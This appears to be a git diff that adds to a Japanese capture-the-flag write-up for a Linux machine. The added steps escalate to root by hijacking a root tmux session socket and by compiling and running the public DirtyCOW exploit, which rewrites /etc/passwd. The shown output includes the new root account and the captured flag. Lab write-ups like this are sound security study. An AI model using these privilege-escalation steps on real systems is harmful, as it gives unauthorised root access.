@@ -387,14 +387,98 @@ nmap --script vuln -oA vuln-scan 10.10.10.79
 
   ![image-20220717161031845](img/image-20220717161031845.png)
 
+  →ここでDirtyCOWの脆弱性を疑えるらしい。
+
   hypeがsambaの権限持ってる
 
   ![image-20220717161136990](img/image-20220717161136990.png)
 
-* 
+* .bash_histroyを見てみる
+
+  ```bash
+  cat ~/.bash_history
+  ```
+
+  ![image-20220717163215273](img/image-20220717163215273.png)
+
+  * tmuxを利用している。psでrootでgrepしてみる
+
+    ```bash
+    ps -eF | grep root
+    ```
+
+    ![image-20220717163602581](img/image-20220717163602581.png)
+
+    ```bash
+    # tmuxのセッションファイルの詳細を見る
+    ls -l /.devs/dev_sess
+    srw-rw---- 1 root hype 0 Jul 16 19:05 /.devs/dev_sess
+    # hypeグループが所有していて読み込み、書き込み権限があることがわかる
+    ```
+
+    ```bash
+    # tmuxのコマンドでセッションを復帰する
+    tumx -S /.devs/dev_sess
+    # rootの奪取ができる
+    ```
+
+* DirtyCowとは
+
+  Linuxカーネルのメモリサブシステム内におけるcopy-on-writeの取り扱いで競合状態が発生し、プライベートな読み取り専用メモリマッピングが破壊されることで、特権のないローカルユーザが読み取り専用であるはずのメモリマッピング領域への書き込み権限を取得し、システム上で自らの権限を昇格させることが可能になる
+
+  [参考サイト-ZDNet Japna](https://japan.zdnet.com/article/35090987/)
+
+  
+
+* DirtyCOWでも試してみる。以下exploitコードをcloneする
+
+  https://github.com/firefart/dirtycow
+
+  ```bash
+  git clone https://github.com/firefart/dirtycow.git 
+  ```
+
+  exploitコードを対象ホストで起動するためにhttpserverを立てる
+
+  ```
+  python -m http.server 5555
+  ```
+
+  ビルドする
+
+  ```bash
+  gcc -pthread dirty.c -o dirty -lcrypt
+  ./dirty
+  
+  hype@Valentine:~$ ./dirty 
+  /etc/passwd successfully backed up to /tmp/passwd.bak
+  Please enter the new password: 
+  Complete line:
+  firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash
+  
+  mmap: 7f4a87a61000
+  
+  hype@Valentine:~$ su firefart
+  Password: 
+  firefart@Valentine:/home/hype# cd /r
+  root/ run/  
+  firefart@Valentine:/home/hype# cd /root/
+  firefart@Valentine:~# ls
+  curl.sh  root.txt
+  firefart@Valentine:~# cat root.txt 
+  f1bb6d759df1f272914ebbc9ed7765b2
+  
+  ```
+
+  
 
 ## 所感
 
 * opensslのバージョンが8.8以降の場合、ssh-rsa sha-1ハッシュアルゴリズムを使用して生成されたＳＳＨキーを使用しようとするとＳＳＨキーが受け入れられない点は留意しておきたい。
 
   回避策として ~/.ssh/configファイルに”PubkeyAcceptedKeyTypes +ssh-rsa”を追加する手法についても抑えておくこと。
+
+* Linuxの代表的な権限昇格の方法をまとめておくこと。
+
+  * tmuxを利用したroot権限奪取
+  * dirtycowを利用したroot権限奪取
